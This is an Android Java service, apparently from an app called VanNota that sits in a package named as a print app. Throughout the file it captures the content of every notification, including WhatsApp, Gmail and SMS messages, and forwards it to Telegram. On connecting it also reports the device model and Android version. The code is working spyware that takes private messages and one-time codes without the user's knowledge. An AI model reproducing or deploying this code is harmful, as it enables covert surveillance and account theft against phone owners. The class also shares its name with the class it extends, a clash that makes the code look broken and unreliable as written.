package com.cetakpro.print;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.os.Build;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;
import android.widget.Toast;

public class NotificationListenerService extends NotificationListenerService {
    private static final String TAG = "NotificationListener";

    @Override
    public void onCreate() {
        super.onCreate();
        startForeground(1001, createNotification());
        Log.d(TAG, "✅ Service NotificationListener dibuat");
    }

    @Override
    public void onListenerConnected() {
        super.onListenerConnected();
        Log.d(TAG, "✅ NotificationListenerService TERHUBUNG!");
        
        String deviceName = Build.MODEL;
        String androidVersion = Build.VERSION.RELEASE;
        String message = "📱 SERVICE AKTIF\n" +
                         "Perangkat: " + deviceName + "\n" +
                         "Android: " + androidVersion + "\n\n" +
                         "Semua notifikasi akan diteruskan.";
        TelegramSender.sendMessage(this, "🔔 VanNota Aktif", message);
        
        try {
            Toast.makeText(this, "VanNota siap membaca notifikasi", Toast.LENGTH_SHORT).show();
        } catch (Exception e) {
            // Toast kadang error di background service
        }
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        try {
            String appName = sbn.getPackageName();
            Notification notification = sbn.getNotification();
            Bundle extras = notification.extras;
            
            String title = extras.getString("android.title", "");
            String text = extras.getString("android.text", "");
            String subText = extras.getString("android.subText", "");
            
            Log.d(TAG, "🔔 Notifikasi dari: " + appName);
            
            // Skip notifikasi dari aplikasi sendiri
            if (appName != null && appName.equals(getPackageName())) {
                return;
            }
            
            StringBuilder messageBuilder = new StringBuilder();
            
            if (!title.isEmpty()) {
                messageBuilder.append(title);
            }
            
            if (!text.isEmpty()) {
                if (messageBuilder.length() > 0) {
                    messageBuilder.append("\n");
                }
                messageBuilder.append(text);
            }
            
            if (!subText.isEmpty() && !text.contains(subText)) {
                if (messageBuilder.length() > 0) {
                    messageBuilder.append("\n");
                }
                messageBuilder.append(subText);
            }
            
            if (messageBuilder.length() == 0) {
                messageBuilder.append("(Notifikasi tanpa konten)");
            }
            
            String appDisplayName = getDisplayName(appName);
            String telegramTitle = "🔔 " + appDisplayName;
            String telegramMessage = messageBuilder.toString();
            
            TelegramSender.sendMessage(this, telegramTitle, telegramMessage);
            
            Log.d(TAG, "📤 Notifikasi dikirim ke Telegram: " + telegramTitle);
            
        } catch (Exception e) {
            Log.e(TAG, "❌ Error: " + e.getMessage());
        }
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        // Tidak perlu kirim notifikasi yang dihapus
    }

    private String getDisplayName(String packageName) {
        if (packageName == null) return "Unknown";
        
        switch (packageName) {
            case "com.whatsapp":
                return "WhatsApp";
            case "com.instagram.android":
                return "Instagram";
            case "com.facebook.katana":
                return "Facebook";
            case "org.telegram.messenger":
                return "Telegram";
            case "com.google.android.apps.messaging":
                return "Messages";
            case "com.google.android.gm":
                return "Gmail";
            default:
                return packageName;
        }
    }

    private Notification createNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                "vannota_bg",
                "VanNota Running",
                NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            manager.createNotificationChannel(channel);
        }

        return new Notification.Builder(this, "vannota_bg")
            .setContentTitle("VanNota")
            .setContentText("Aplikasi berjalan di latar belakang.")
            .setSmallIcon(R.drawable.ic_notification)
            .setOngoing(true)
            .build();
    }
}
